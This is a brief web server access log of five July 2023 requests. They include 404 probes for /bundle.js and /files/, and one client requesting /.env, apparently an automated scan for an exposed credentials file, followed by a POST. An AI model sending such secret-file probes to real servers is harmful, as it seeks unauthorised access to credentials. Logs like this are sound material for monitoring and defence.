146.190.250.159 - - [24/Jul/2023:16:09:08 +0000] "GET /bundle.js HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
146.190.250.159 - - [24/Jul/2023:16:09:08 +0000] "GET /files/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
189.127.145.237 - - [24/Jul/2023:16:26:46 +0000] "GET / HTTP/1.1" 200 5374 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
87.120.88.141 - - [24/Jul/2023:16:33:42 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
87.120.88.141 - - [24/Jul/2023:16:33:42 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
